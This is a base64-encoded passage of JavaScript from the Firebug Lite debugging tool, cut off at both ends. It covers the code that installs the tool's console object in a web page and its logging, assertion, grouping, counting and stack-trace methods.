lzQXR0YWNoZWQoY29udGV4dCwgd2luKSkNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIkNvbnNvbGUuYXR0YWNoSWZOZWVkZWQgZm91bmQgaXNBdHRhY2hlZCBmYWxzZSAiKTsNCg0KICAgICAgICB0aGlzLmF0dGFjaENvbnNvbGVJbmplY3Rvcihjb250ZXh0LCB3aW4pOw0KICAgICAgICB0aGlzLmFkZENvbnNvbGVMaXN0ZW5lcihjb250ZXh0LCB3aW4pOw0KDQogICAgICAgIEZpcmVidWcuQ29uc29sZS5jbGVhclJlbG9hZFdhcm5pbmcoY29udGV4dCk7DQoNCiAgICAgICAgdmFyIGF0dGFjaGVkID0gIHRoaXMuaXNBdHRhY2hlZChjb250ZXh0LCB3aW4pOw0KICAgICAgICBpZiAoYXR0YWNoZWQpDQogICAgICAgICAgICBkaXNwYXRjaChGaXJlYnVnLkNvbnNvbGUuZmJMaXN0ZW5lcnMsICJvbkNvbnNvbGVJbmplY3RlZCIsIFtjb250ZXh0LCB3aW5dKTsNCg0KICAgICAgICByZXR1cm4gYXR0YWNoZWQ7DQogICAgfSwNCg0KICAgIGF0dGFjaENvbnNvbGVJbmplY3RvcjogZnVuY3Rpb24oY29udGV4dCwgd2luKQ0KICAgIHsNCiAgICAgICAgdmFyIGNvbnNvbGVJbmplY3Rpb24gPSB0aGlzLmdldENvbnNvbGVJbmplY3Rpb25TY3JpcHQoKTsgIC8vIERvIGl0IGFsbCBoZXJlLg0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImF0dGFjaENvbnNvbGVJbmplY3RvciBldmFsdWF0aW5nIGluICIrd2luLmxvY2F0aW9uLCBjb25zb2xlSW5qZWN0aW9uKTsNCg0KICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLmV2YWx1YXRlSW5XZWJQYWdlKGNvbnNvbGVJbmplY3Rpb24sIGNvbnRleHQsIHdpbik7DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiYXR0YWNoQ29uc29sZUluamVjdG9yIGV2YWx1YXRpb24gY29tcGxldGVkIGZvciAiK3dpbi5sb2NhdGlvbik7DQogICAgfSwNCg0KICAgIGdldENvbnNvbGVJbmplY3Rpb25TY3JpcHQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICBpZiAoIXRoaXMuY29uc29sZUluamVjdGlvblNjcmlwdCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNjcmlwdCA9ICIiOw0KICAgICAgICAgICAgc2NyaXB0ICs9ICJ3aW5kb3cuX19kZWZpbmVHZXR0ZXJfXygnY29uc29sZScsIGZ1bmN0aW9uKCkge1xuIjsNCiAgICAgICAgICAgIHNjcmlwdCArPSAiIHJldHVybiAod2luZG93Ll9maXJlYnVnID8gd2luZG93Ll9maXJlYnVnIDogd2luZG93LmxvYWRGaXJlYnVnQ29uc29sZSgpKTsgfSlcblxuIjsNCg0KICAgICAgICAgICAgc2NyaXB0ICs9ICJ3aW5kb3cubG9hZEZpcmVidWdDb25zb2xlID0gZnVuY3Rpb24oKSB7XG4iOw0KICAgICAgICAgICAgc2NyaXB0ICs9ICJ3aW5kb3cuX2ZpcmVidWcgPSAgbmV3IF9GaXJlYnVnQ29uc29sZSgpOyI7DQoNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIHNjcmlwdCArPSAiIHdpbmRvdy5kdW1wKCdsb2FkRmlyZWJ1Z0NvbnNvbGUgJyt3aW5kb3cubG9jYXRpb24rJ1xcbicpO1xuIjsNCg0KICAgICAgICAgICAgc2NyaXB0ICs9ICIgcmV0dXJuIHdpbmRvdy5fZmlyZWJ1ZyB9O1xuIjsNCg0KICAgICAgICAgICAgdmFyIHRoZUZpcmVidWdDb25zb2xlU2NyaXB0ID0gZ2V0UmVzb3VyY2UoImNocm9tZTovL2ZpcmVidWcvY29udGVudC9jb25zb2xlSW5qZWN0ZWQuanMiKTsNCiAgICAgICAgICAgIHNjcmlwdCArPSB0aGVGaXJlYnVnQ29uc29sZVNjcmlwdDsNCg0KDQogICAgICAgICAgICB0aGlzLmNvbnNvbGVJbmplY3Rpb25TY3JpcHQgPSBzY3JpcHQ7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRoaXMuY29uc29sZUluamVjdGlvblNjcmlwdDsNCiAgICB9LA0KDQogICAgZm9yY2VDb25zb2xlQ29tcGlsYXRpb25JblBhZ2U6IGZ1bmN0aW9uKGNvbnRleHQsIHdpbikNCiAgICB7DQogICAgICAgIGlmICghd2luKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibm8gd2luIGluIGZvcmNlQ29uc29sZUNvbXBpbGF0aW9uSW5QYWdlISIpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIGNvbnNvbGVGb3JjZXIgPSAid2luZG93LmxvYWRGaXJlYnVnQ29uc29sZSgpOyI7DQoNCiAgICAgICAgaWYgKGNvbnRleHQuc3RvcHBlZCkNCiAgICAgICAgICAgIEZpcmVidWcuQ29uc29sZS5pbmplY3Rvci5ldmFsdWF0ZUNvbnNvbGVTY3JpcHQoY29udGV4dCk7ICAvLyB0b2RvIGV2YWx1YXRlIGNvbnNvbGVGb3JjZXIgb24gc3RhY2sNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgRmlyZWJ1Zy5Db21tYW5kTGluZS5ldmFsdWF0ZUluV2ViUGFnZShjb25zb2xlRm9yY2VyLCBjb250ZXh0LCB3aW4pOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImZvcmNlQ29uc29sZUNvbXBpbGF0aW9uSW5QYWdlICIrd2luLmxvY2F0aW9uLCBjb25zb2xlRm9yY2VyKTsNCiAgICB9LA0KDQogICAgZXZhbHVhdGVDb25zb2xlU2NyaXB0OiBmdW5jdGlvbihjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHNjcmlwdFNvdXJjZSA9IHRoaXMuZ2V0Q29uc29sZUluamVjdGlvblNjcmlwdCgpOyAvLyBUT0RPIFhYWGpqYiB0aGlzIHNob3VsZCBiZSBnZXRDb25zb2xlSW5qZWN0aW9uU2NyaXB0DQogICAgICAgIEZpcmVidWcuRGVidWdnZXIuZXZhbHVhdGUoc2NyaXB0U291cmNlLCBjb250ZXh0KTsNCiAgICB9LA0KDQogICAgYWRkQ29uc29sZUxpc3RlbmVyOiBmdW5jdGlvbihjb250ZXh0LCB3aW4pDQogICAgew0KICAgICAgICBpZiAoIWNvbnRleHQuYWN0aXZlQ29uc29sZUhhbmRsZXJzKSAgLy8gdGhlbiB3ZSBoYXZlIG5vdCBiZWVuIHRoaXMgd2F5IGJlZm9yZQ0KICAgICAgICAgICAgY29udGV4dC5hY3RpdmVDb25zb2xlSGFuZGxlcnMgPSBbXTsNCiAgICAgICAgZWxzZQ0KICAgICAgICB7ICAgLy8gd2UndmUgYmVlbiB0aGlzIHdheSBiZWZvcmUuLi4NCiAgICAgICAgICAgIGZvciAodmFyIGk9MDsgaTxjb250ZXh0LmFjdGl2ZUNvbnNvbGVIYW5kbGVycy5sZW5ndGg7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoY29udGV4dC5hY3RpdmVDb25zb2xlSGFuZGxlcnNbaV0ud2luZG93ID09IHdpbikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQuYWN0aXZlQ29uc29sZUhhbmRsZXJzW2ldLmRldGFjaCgpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlSW5qZWN0b3IgYWRkQ29uc29sZUxpc3RlbmVyIHJlbW92ZWQgaGFuZGxlcigiK2NvbnRleHQuYWN0aXZlQ29uc29sZUhhbmRsZXJzW2ldLmhhbmRsZXJfbmFtZSsiKSBmcm9tIF9maXJlYnVnQ29uc29sZSBpbiA6ICIrd2luLmxvY2F0aW9uKyJcbiIpOw0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmFjdGl2ZUNvbnNvbGVIYW5kbGVycy5zcGxpY2UoaSwxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyBXZSBuZWVkIHRoZSBlbGVtZW50IHRvIGF0dGFjaCBvdXIgZXZlbnQgbGlzdGVuZXIuDQogICAgICAgIHZhciBlbGVtZW50ID0gRmlyZWJ1Zy5Db25zb2xlLmdldEZpcmVidWdDb25zb2xlRWxlbWVudChjb250ZXh0LCB3aW4pOw0KICAgICAgICBpZiAoZWxlbWVudCkNCiAgICAgICAgICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCJGaXJlYnVnVmVyc2lvbiIsIEZpcmVidWcudmVyc2lvbik7IC8vIEluaXRpYWxpemUgRmlyZWJ1ZyB2ZXJzaW9uLg0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICAgICAgdmFyIGhhbmRsZXIgPSBuZXcgRmlyZWJ1Z0NvbnNvbGVIYW5kbGVyKGNvbnRleHQsIHdpbik7DQogICAgICAgIGhhbmRsZXIuYXR0YWNoVG8oZWxlbWVudCk7DQoNCiAgICAgICAgY29udGV4dC5hY3RpdmVDb25zb2xlSGFuZGxlcnMucHVzaChoYW5kbGVyKTsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlSW5qZWN0b3IgYWRkQ29uc29sZUxpc3RlbmVyIGF0dGFjaGVkIGhhbmRsZXIoIitoYW5kbGVyLmhhbmRsZXJfbmFtZSsiKSB0byBfZmlyZWJ1Z0NvbnNvbGUgaW4gOiAiK3dpbi5sb2NhdGlvbisiXG4iKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfSwNCg0KICAgIGRldGFjaENvbnNvbGU6IGZ1bmN0aW9uKGNvbnRleHQsIHdpbikNCiAgICB7DQogICAgICAgIGlmICh3aW4gJiYgd2luLmRvY3VtZW50KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgZWxlbWVudCA9IHdpbi5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiX2ZpcmVidWdDb25zb2xlIik7DQogICAgICAgICAgICBpZiAoZWxlbWVudCkNCiAgICAgICAgICAgICAgICBlbGVtZW50LnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZWxlbWVudCk7DQogICAgICAgIH0NCiAgICB9DQp9Ow0KDQp2YXIgdG90YWxfaGFuZGxlcnMgPSAwOw0KdmFyIEZpcmVidWdDb25zb2xlSGFuZGxlciA9IGZ1bmN0aW9uIEZpcmVidWdDb25zb2xlSGFuZGxlcihjb250ZXh0LCB3aW4pDQp7DQogICAgdGhpcy53aW5kb3cgPSB3aW47DQoNCiAgICB0aGlzLmF0dGFjaFRvID0gZnVuY3Rpb24oZWxlbWVudCkNCiAgICB7DQogICAgICAgIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7DQogICAgICAgIC8vIFdoZW4gcmFpc2VkIG9uIG91ciBpbmplY3RlZCBlbGVtZW50LCBjYWxsYmFjayB0byBGaXJlYnVnIGFuZCBhcHBlbmQgdG8gY29uc29sZQ0KICAgICAgICB0aGlzLmJvdW5kSGFuZGxlciA9IGJpbmQodGhpcy5oYW5kbGVFdmVudCwgdGhpcyk7DQogICAgICAgIHRoaXMuZWxlbWVudC5hZGRFdmVudExpc3RlbmVyKCdmaXJlYnVnQXBwZW5kQ29uc29sZScsIHRoaXMuYm91bmRIYW5kbGVyLCB0cnVlKTsgLy8gY2FwdHVyaW5nDQogICAgfTsNCg0KICAgIHRoaXMuZGV0YWNoID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5lbGVtZW50LnJlbW92ZUV2ZW50TGlzdGVuZXIoJ2ZpcmVidWdBcHBlbmRDb25zb2xlJywgdGhpcy5ib3VuZEhhbmRsZXIsIHRydWUpOw0KICAgIH07DQoNCiAgICB0aGlzLmhhbmRsZXJfbmFtZSA9ICsrdG90YWxfaGFuZGxlcnM7DQogICAgdGhpcy5oYW5kbGVFdmVudCA9IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiRmlyZWJ1Z0NvbnNvbGVIYW5kbGVyKCIrdGhpcy5oYW5kbGVyX25hbWUrIikgIitldmVudC50YXJnZXQuZ2V0QXR0cmlidXRlKCJtZXRob2ROYW1lIikrIiwgZXZlbnQiLCBldmVudCk7DQogICAgICAgIGlmICghRmlyZWJ1Zy5Db21tYW5kTGluZS5Db21tYW5kSGFuZGxlci5oYW5kbGUoZXZlbnQsIHRoaXMsIHdpbikpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJGaXJlYnVnQ29uc29sZUhhbmRsZXIiLCB0aGlzKTsNCg0KICAgICAgICAgICAgdmFyIG1ldGhvZE5hbWUgPSBldmVudC50YXJnZXQuZ2V0QXR0cmlidXRlKCJtZXRob2ROYW1lIik7DQogICAgICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKCRTVFJGKCJjb25zb2xlLk1ldGhvZE5vdFN1cHBvcnRlZCIsIFttZXRob2ROYW1lXSkpOw0KICAgICAgICB9DQogICAgfTsNCg0KICAgIHRoaXMuZmlyZWJ1Z2xpdGUgPSBGaXJlYnVnLnZlcnNpb247ICAgIA0KDQogICAgdGhpcy5pbml0ID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIGNvbnNvbGVFbGVtZW50ID0gd2luLmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdfZmlyZWJ1Z0NvbnNvbGUnKTsNCiAgICAgICAgY29uc29sZUVsZW1lbnQuc2V0QXR0cmlidXRlKCJGaXJlYnVnVmVyc2lvbiIsIEZpcmVidWcudmVyc2lvbik7DQogICAgfTsNCg0KICAgIHRoaXMubG9nID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgbG9nRm9ybWF0dGVkKGFyZ3VtZW50cywgImxvZyIpOw0KICAgIH07DQoNCiAgICB0aGlzLmRlYnVnID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgbG9nRm9ybWF0dGVkKGFyZ3VtZW50cywgImRlYnVnIiwgdHJ1ZSk7DQogICAgfTsNCg0KICAgIHRoaXMuaW5mbyA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGxvZ0Zvcm1hdHRlZChhcmd1bWVudHMsICJpbmZvIiwgdHJ1ZSk7DQogICAgfTsNCg0KICAgIHRoaXMud2FybiA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGxvZ0Zvcm1hdHRlZChhcmd1bWVudHMsICJ3YXJuIiwgdHJ1ZSk7DQogICAgfTsNCg0KICAgIHRoaXMuZXJyb3IgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvIGNvbnNvbGUgZXJyb3INCiAgICAgICAgLy9pZiAoYXJndW1lbnRzLmxlbmd0aCA9PSAxKQ0KICAgICAgICAvL3sNCiAgICAgICAgLy8gICAgbG9nQXNzZXJ0KCJlcnJvciIsIGFyZ3VtZW50cyk7ICAvLyBhZGQgbW9yZSBpbmZvIGJhc2VkIG9uIHN0YWNrIHRyYWNlDQogICAgICAgIC8vfQ0KICAgICAgICAvL2Vsc2UNCiAgICAgICAgLy97DQogICAgICAgICAgICAvL0ZpcmVidWcuRXJyb3JzLmluY3JlYXNlQ291bnQoY29udGV4dCk7DQogICAgICAgICAgICBsb2dGb3JtYXR0ZWQoYXJndW1lbnRzLCAiZXJyb3IiLCB0cnVlKTsgIC8vIHVzZXIgYWxyZWFkeSBhZGRlZCBpbmZvDQogICAgICAgIC8vfQ0KICAgIH07DQoNCiAgICB0aGlzLmV4Y2VwdGlvbiA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGxvZ0Fzc2VydCgiZXJyb3IiLCBhcmd1bWVudHMpOw0KICAgIH07DQoNCiAgICB0aGlzLmFzc2VydCA9IGZ1bmN0aW9uKHgpDQogICAgew0KICAgICAgICBpZiAoIXgpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciByZXN0ID0gW107DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMTsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7IGkrKykNCiAgICAgICAgICAgICAgICByZXN0LnB1c2goYXJndW1lbnRzW2ldKTsNCiAgICAgICAgICAgIGxvZ0Fzc2VydCgiYXNzZXJ0IiwgcmVzdCk7DQogICAgICAgIH0NCiAgICB9Ow0KDQogICAgdGhpcy5kaXIgPSBmdW5jdGlvbihvKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmxvZyhvLCBjb250ZXh0LCAiZGlyIiwgRmlyZWJ1Zy5ET01QYW5lbC5EaXJUYWJsZSk7DQogICAgfTsNCg0KICAgIHRoaXMuZGlyeG1sID0gZnVuY3Rpb24obykNCiAgICB7DQogICAgICAgIC8vL2lmIChvIGluc3RhbmNlb2YgV2luZG93KQ0KICAgICAgICBpZiAoaW5zdGFuY2VPZihvLCAiV2luZG93IikpDQogICAgICAgICAgICBvID0gby5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ7DQogICAgICAgIC8vL2Vsc2UgaWYgKG8gaW5zdGFuY2VvZiBEb2N1bWVudCkNCiAgICAgICAgZWxzZSBpZiAoaW5zdGFuY2VPZihvLCAiRG9jdW1lbnQiKSkNCiAgICAgICAgICAgIG8gPSBvLmRvY3VtZW50RWxlbWVudDsNCg0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKG8sIGNvbnRleHQsICJkaXJ4bWwiLCBGaXJlYnVnLkhUTUxQYW5lbC5Tb2xvRWxlbWVudCk7DQogICAgfTsNCg0KICAgIHRoaXMuZ3JvdXAgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvOw0KICAgICAgICAvL3ZhciBzb3VyY2VMaW5rID0gZ2V0U3RhY2tMaW5rKCk7DQogICAgICAgIHZhciBzb3VyY2VMaW5rID0gbnVsbDsNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLm9wZW5Hcm91cChhcmd1bWVudHMsIG51bGwsICJncm91cCIsIG51bGwsIGZhbHNlLCBzb3VyY2VMaW5rKTsNCiAgICB9Ow0KDQogICAgdGhpcy5ncm91cEVuZCA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuQ29uc29sZS5jbG9zZUdyb3VwKGNvbnRleHQpOw0KICAgIH07DQoNCiAgICB0aGlzLmdyb3VwQ29sbGFwc2VkID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHNvdXJjZUxpbmsgPSBnZXRTdGFja0xpbmsoKTsNCiAgICAgICAgLy8gbm9UaHJvdHRsZSB0cnVlIGlzIHByb2JhYmx5IG9rLCBvcGVuR3JvdXBzIHdpbGwgbGlrZWx5IGJlIHNob3J0IHN0cmluZ3MuDQogICAgICAgIHZhciByb3cgPSBGaXJlYnVnLkNvbnNvbGUub3Blbkdyb3VwKGFyZ3VtZW50cywgbnVsbCwgImdyb3VwIiwgbnVsbCwgdHJ1ZSwgc291cmNlTGluayk7DQogICAgICAgIHJlbW92ZUNsYXNzKHJvdywgIm9wZW5lZCIpOw0KICAgIH07DQoNCiAgICB0aGlzLnByb2ZpbGUgPSBmdW5jdGlvbih0aXRsZSkNCiAgICB7DQogICAgICAgIGxvZ0Zvcm1hdHRlZChbImNvbnNvbGUucHJvZmlsZSgpIG5vdCBzdXBwb3J0ZWQuIl0sICJ3YXJuIiwgdHJ1ZSk7DQogICAgICAgIA0KICAgICAgICAvL0ZpcmVidWcuUHJvZmlsZXIuc3RhcnRQcm9maWxpbmcoY29udGV4dCwgdGl0bGUpOw0KICAgIH07DQoNCiAgICB0aGlzLnByb2ZpbGVFbmQgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBsb2dGb3JtYXR0ZWQoWyJjb25zb2xlLnByb2ZpbGUoKSBub3Qgc3VwcG9ydGVkLiJdLCAid2FybiIsIHRydWUpOw0KICAgICAgICANCiAgICAgICAgLy9GaXJlYnVnLlByb2ZpbGVyLnN0b3BQcm9maWxpbmcoY29udGV4dCk7DQogICAgfTsNCg0KICAgIHRoaXMuY291bnQgPSBmdW5jdGlvbihrZXkpDQogICAgew0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBjb25zb2xlMjogaXMgdGhlcmUgYSBiZXR0ZXIgd2F5IHRvIGZpbmQgYSB1bmlxdWUgSUQgZm9yIHRoZSBjb3VuKCkgY2FsbD8NCiAgICAgICAgdmFyIGZyYW1lSWQgPSAiMCI7DQogICAgICAgIC8vdmFyIGZyYW1lSWQgPSBGQkwuZ2V0U3RhY2tGcmFtZUlkKCk7DQogICAgICAgIGlmIChmcmFtZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIWZyYW1lQ291bnRlcnMpDQogICAgICAgICAgICAgICAgZnJhbWVDb3VudGVycyA9IHt9Ow0KDQogICAgICAgICAgICBpZiAoa2V5ICE9IHVuZGVmaW5lZCkNCiAgICAgICAgICAgICAgICBmcmFtZUlkICs9IGtleTsNCg0KICAgICAgICAgICAgdmFyIGZyYW1lQ291bnRlciA9IGZyYW1lQ291bnRlcnNbZnJhbWVJZF07DQogICAgICAgICAgICBpZiAoIWZyYW1lQ291bnRlcikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbG9nUm93ID0gbG9nRm9ybWF0dGVkKFsiMCJdLCBudWxsLCB0cnVlLCB0cnVlKTsNCg0KICAgICAgICAgICAgICAgIGZyYW1lQ291bnRlciA9IHtsb2dSb3c6IGxvZ1JvdywgY291bnQ6IDF9Ow0KICAgICAgICAgICAgICAgIGZyYW1lQ291bnRlcnNbZnJhbWVJZF0gPSBmcmFtZUNvdW50ZXI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgKytmcmFtZUNvdW50ZXIuY291bnQ7DQoNCiAgICAgICAgICAgIHZhciBsYWJlbCA9IGtleSA9PSB1bmRlZmluZWQNCiAgICAgICAgICAgICAgICA/IGZyYW1lQ291bnRlci5jb3VudA0KICAgICAgICAgICAgICAgIDoga2V5ICsgIiAiICsgZnJhbWVDb3VudGVyLmNvdW50Ow0KDQogICAgICAgICAgICBmcmFtZUNvdW50ZXIubG9nUm93LmZpcnN0Q2hpbGQuZmlyc3RDaGlsZC5ub2RlVmFsdWUgPSBsYWJlbDsNCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICB0aGlzLnRyYWNlID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIGdldEZ1bmNOYW1lID0gZnVuY3Rpb24gZ2V0RnVuY05hbWUgKGYpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChmLmdldE5hbWUgaW5zdGFuY2VvZiBGdW5jdGlvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZi5nZXROYW1lKCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoZi5uYW1lKSAvLyBpbiBGaXJlRm94LCBGdW5jdGlvbiBvYmplY3RzIGhhdmUgYSBuYW1lIHByb3BlcnR5Li4uDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGYubmFtZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIG5hbWUgPSBmLnRvU3RyaW5nKCkubWF0Y2goL2Z1bmN0aW9uXHMqKFtfJFx3XGRdKikvKVsxXTsNCiAgICAgICAgICAgIHJldHVybiBuYW1lIHx8ICJhbm9ueW1vdXMiOw0KICAgICAgICB9Ow0KICAgICAgICANCiAgICAgICAgdmFyIHdhc1Zpc2l0ZWQgPSBmdW5jdGlvbihmbikNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgaT0wLCBsPWZyYW1lcy5sZW5ndGg7IGk8bDsgaSsrKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChmcmFtZXNbaV0uZm4gPT0gZm4pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHRyYWNlUmVjdXJzaW9uKys7DQogICAgICAgIA0KICAgICAgICBpZiAodHJhY2VSZWN1cnNpb24gPiAxKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cmFjZVJlY3Vyc2lvbi0tOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgDQogICAgICAgIHZhciBmcmFtZXMgPSBbXTsNCiAgICAgICAgDQogICAgICAgIGZvciAodmFyIGZuID0gYXJndW1lbnRzLmNhbGxlZS5jYWxsZXIuY2FsbGVyOyBmbjsgZm4gPSBmbi5jYWxsZXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh3YXNWaXNpdGVkKGZuKSkgYnJlYWs7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBhcmdzID0gW107DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBsID0gZm4uYXJndW1lbnRzLmxlbmd0aDsgaSA8IGw7ICsraSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhcmdzLnB1c2goe3ZhbHVlOiBmbi5hcmd1bWVudHNbaV19KTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZnJhbWVzLnB1c2goe2ZuOiBmbiwgbmFtZTogZ2V0RnVuY05hbWUoZm4pLCBhcmdzOiBhcmdzfSk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgKDApKCk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJlc3VsdCA9IGU7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBzdGFjayA9IA0KICAgICAgICAgICAgICAgIHJlc3VsdC5zdGFjayB8fCAvLyBGaXJlZm94IC8gR29vZ2xlIENocm9tZSANCiAgICAgICAgICAgICAgICByZXN1bHQuc3RhY2t0cmFjZSB8fCAvLyBPcGVyYQ0KICAgICAgICAgICAgICAgICIiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBzdGFjayA9IHN0YWNrLnJlcGxhY2UoL1xuXHJ8XHJcbi9nLCAiXG4iKTsgLy8gbm9ybWFsaXplIGxpbmUgYnJlYWtzDQogICAgICAgICAgICB2YXIgaXRlbXMgPSBzdGFjay5zcGxpdCgvW1xuXHJdLyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgICAgICAvLyBHb29nbGUgQ2hyb21lDQogICAgICAgICAgICBpZiAoRkJMLmlzU2FmYXJpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vdmFyIHJlQ2hyb21lU3RhY2tJdGVtID0gL15ccythdFxzKyhbXlwoXSspXHNcKCguKilcKSQvOw0KICAgICAgICAgICAgICAgIC8vdmFyIHJlQ2hyb21lU3RhY2tJdGVtID0gL15ccythdFxzKyguKikoKD86aHR0cHxodHRwc3xmdHB8ZmlsZSk6XC9cLy4qKSQvOw0KICAgICAgICAgICAgICAgIHZhciByZUNocm9tZVN0YWNrSXRlbSA9IC9eXHMrYXRccysoLiopKCg/Omh0dHB8aHR0cHN8ZnRwfGZpbGUpOlwvXC8uKikkLzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgcmVDaHJvbWVTdGFja0l0ZW1OYW1lID0gL1xzKlwoJC87DQogICAgICAgICAgICAgICAgdmFyIHJlQ2hyb21lU3RhY2tJdGVtVmFsdWUgPSAvXiguKylcOihcZCtcOlxkKylcKT8kLzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICA